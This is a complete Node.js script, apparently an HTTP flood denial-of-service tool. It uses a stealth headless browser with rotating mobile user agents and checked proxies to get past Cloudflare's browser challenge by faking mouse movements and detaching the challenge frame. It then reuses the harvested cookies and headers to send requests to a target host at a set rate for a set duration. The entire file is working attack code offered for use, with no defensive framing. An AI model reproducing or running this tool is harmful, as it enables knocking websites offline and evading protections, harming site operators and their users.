const fs = require('fs');
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const puppeteerAnonymize = require("puppeteer-extra-plugin-anonymize-ua");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const { HttpsProxyAgent } = require('https-proxy-agent');
const https = require('https');
const axios = require('axios');

const USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
];

const sleep = (duration) => new Promise(resolve => setTimeout(resolve, duration * 1000));

// Fungsi parsing argumen, cari --proxy dan ambil nilainya
function parseArguments() {
    const args = process.argv.slice(2);
    if (args.length < 3) {
        console.error("Usage: node script.js <host> <duration> <rates> [--proxy proxy.txt]");
        process.exit(1);
    }

    const host = args[0];
    const duration = parseInt(args[1]);
    const rates = parseInt(args[2]);

    let proxyFile = null;
    for (let i = 3; i < args.length; i++) {
        if (args[i] === '--proxy' && args[i + 1]) {
            proxyFile = args[i + 1];
            break;
        }
    }

    return { host, duration, rates, proxyFile };
}

class brs {
    constructor(host, duration, rates, proxy) {
        this.host = host;
        this.duration = duration;
        this.rates = rates;
        this.proxy = proxy || null;
        this.headersBrowser = '';
        puppeteer.use(puppeteerStealth());
        puppeteer.use(puppeteerAnonymize());
        puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
    }

    async mouser(page) {
        const pageViewport = page.viewport();
        if (!pageViewport) return;
        for (let i = 0; i < 3; i++) {
            const x = Math.floor(Math.random() * pageViewport.width);
            const y = Math.floor(Math.random() * pageViewport.height);
            await page.mouse.click(x, y);
            await sleep(0.2);
        }
        const centerX = pageViewport.width / 2;
        const centerY = pageViewport.height / 2;
        await page.mouse.move(centerX, centerY);
        await page.mouse.down();

        const movements = [
            [centerX + 100, centerY],
            [centerX + 100, centerY + 100],
            [centerX, centerY + 100],
            [centerX, centerY]
        ];

        for (const [x, y] of movements) {
            await page.mouse.move(x, y, { steps: 10 });
            await sleep(0.2);
        }

        await page.mouse.up();
        await sleep(1.5);
    }

    async detectChallenge(browser, page) {
        const content = await page.content();
        if (content.includes("challenge-platform")) {
            try {
                await sleep(2.5);
                await this.mouser(page);
                const element = await page.$('body > div.main-wrapper > div > div > div > div');
                if (element) {
                    const box = await element.boundingBox();
                    await page.mouse.click(box.x + 30, box.y + 30);
                }
                if (content.includes("challenge-platform")) {
                    await sleep(1);
                    await this.detectChallenge(browser, page);
                }
                await sleep(3);
            } catch (error) {
                console.log("[ERROR] Challenge detection failed:", error);
            }
        }
    }

    async openBrowser(host) {
        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        let proxyUrl = this.proxy || '';
        let proxyHost = '';
        let proxyPort = '';
        let proxyUsername = '';
        let proxyPassword = '';

        if (proxyUrl) {
            const match = proxyUrl.match(/^(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$/);
            if (match) {
                proxyUsername = match[1] || '';
                proxyPassword = match[2] || '';
                proxyHost = match[3];
                proxyPort = match[4];
            } else {
                const parts = proxyUrl.split(':');
                proxyHost = parts[0];
                proxyPort = parts[1];
            }
        }
        
        const options = {
            headless: 'new',
            args: [
                ...(this.proxy ? [`--proxy-server=${this.proxy}`] : []),
                "--no-sandbox",
                "--no-first-run",
                "--test-type",
                `--user-agent=${userAgent}`,
                "--disable-browser-side-navigation",
                "--disable-extensions",
                "--disable-gpu",
                "--disable-dev-shm-usage",
                "--ignore-certificate-errors",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-infobars",
                "--hide-scrollbars",
                "--disable-setuid-sandbox",
                "--mute-audio",
                "--no-zygote"
            ],
            ignoreHTTPSErrors: true,
            javaScriptEnabled: true,
        };

        let browser, page;
        try {
            browser = await puppeteer.launch(options);
            [page] = await browser.pages();
            
            if (proxyUsername && proxyPassword) {
                await page.authenticate({ username: proxyUsername, password: proxyPassword });
            }
            const client = page._client();
            await page.setExtraHTTPHeaders({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'DNT': '1',
                'sec-ch-ua-mobile': '?1',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Mode': 'navigate',
                'sec-ch-ua-platform': 'Android',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Dest': 'document',
                'Referer': host,
            });

            await page.on("framenavigated", (frame) => {
                if (frame.url().includes("challenges.cloudflare.com")) {
                    if (frame._id) {
                        client.send("Target.detachFromTarget", { targetId: frame._id }).catch(() => { });
                    }
                }
            });

            await page.setViewport({ width: 1920, height: 1200 });
            page.setDefaultNavigationTimeout(10000);

            const browserPage = await page.goto(host, { waitUntil: "domcontentloaded" });
            await page.screenshot({ path: `screenshot_${Date.now()}.png` });

            page.on('dialog', async dialog => { await dialog.accept(); });

            const status = await browserPage.status();
            const title = await page.evaluate(() => document.title);

            if (['Just a moment...'].includes(title)) {
                console.log(`[INFO] Title: ${title}`);
                await page.on('response', async resp => {
                    this.headersBrowser = resp.request().headers();
                });
                await this.detectChallenge(browser, page);
            }

            const cookies = await page.cookies();
            const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");

            return {
                title: await page.title(),
                headersall: this.headersBrowser,
                cookies: cookieString,
                userAgent: userAgent,
                browser: browser,
                page: page
            };
        } catch (error) {
            console.log("[ERROR] Open Browser Error:", error);
            if (browser) await browser.close();
            return null;
        }
    }

    async flood(host, duration, rates, userAgent, cookies, headersbro) {
        console.log({
            'target': host,
            'userAgent': userAgent,
            'cookies': cookies,
        });

        const endTime = Date.now() + duration * 1000;
        const url = new URL(host);

        const sendRequest = async () => {
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgent,
                        'accept': headersbro['accept'],
                        'accept-language': headersbro['accept-language'],
                        'accept-encoding': headersbro['accept-encoding'],
                        'cache-control': 'no-cache, no-store, private, max-age=0, must-revalidate',
                        'upgrade-insecure-requests': '1',
                        'sec-fetch-dest': headersbro['sec-fetch-dest'],
                        'sec-fetch-mode': headersbro['sec-fetch-mode'],
                        'sec-fetch-site': headersbro['sec-fetch-site'],
                        'TE': headersbro['trailers'],
                        'x-requested-with': 'XMLHttpRequest',
                        'pragma': 'no-cache',
                        'Cookie': cookies
                    }
                });

                if (response.status === 429) {
                    return;
                }
            } catch (error) {
                console.log(error);
            }
        };

        const requestInterval = setInterval(() => {
            for (let i = 0; i < rates; i++) {
                sendRequest();
            }
            if (Date.now() >= endTime) clearInterval(requestInterval);
        }, 1);

        console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
    }

    async start() {
        try {
            const response = await this.openBrowser(this.host);

            if (response) {
                if (['Just a moment...'].includes(response.title)) {
                    console.log("[INFO] Failed to bypass");
                    await response.browser.close();
                    await this.start();
                    return;
                }

                await this.flood(
                    this.host,
                    this.duration,
                    this.rates,
                    response.userAgent,
                    response.cookies,
                    response.headersall
                );
                await response.browser.close();
            }

            setTimeout(() => {
                process.exit(0);
            }, this.duration * 1000);

        } catch (error) {
            console.log(`[ERROR] ${error}`);
        }
    }
}

async function checkProxy(proxy) {
    try {
        let proxyUrl;

        // Cek apakah ada autentikasi
        if (proxy.split(':').length === 4) {
            // Format: ip:port:user:pass
            const [ip, port, user, pass] = proxy.split(':');
            proxyUrl = `http://${user}:${pass}@${ip}:${port}`;
        } else {
            // Format: ip:port
            proxyUrl = `http://${proxy}`;
        }

        const agent = new HttpsProxyAgent(proxyUrl);

        const res = await axios.get('https://api.ipify.org', {
            httpsAgent: agent,
            timeout: 7000
        });

        return !!res.data.trim(); // True jika berhasil ambil IP
    } catch {
        return false;
    }
}

async function main() {
    const { host, duration, rates, proxyFile } = parseArguments();

    let proxies = [];
    if (proxyFile) {
        if (!fs.existsSync(proxyFile)) {
            console.error(`[ERROR] Proxy file ${proxyFile} not found`);
            process.exit(1);
        }
        proxies = fs.readFileSync(proxyFile, 'utf-8')
            .split('\n')
            .map(p => p.trim())
            .filter(p => p.length > 0);
    }

    let selectedProxy = null;
    if (proxies.length > 0) {
        console.log(`[INFO] Found ${proxies.length} proxies. Checking active proxies...`);

        const activeProxies = [];
        for (const proxy of proxies) {
            const ok = await checkProxy(proxy);
            if (ok) {
                activeProxies.push(proxy);
                console.log(`[ACTIVE] ${proxy}`);
            } else {
                console.log(`[INACTIVE] ${proxy}`);
            }
        }

        if (activeProxies.length === 0) {
            console.error("[ERROR] No active proxies available");
            process.exit(1);
        }

        selectedProxy = activeProxies[Math.floor(Math.random() * activeProxies.length)];
        console.log(`[INFO] Using proxy: ${selectedProxy}`);
    }

    const attack = new brs(host, duration, rates, selectedProxy);
    await attack.start();
}

main();
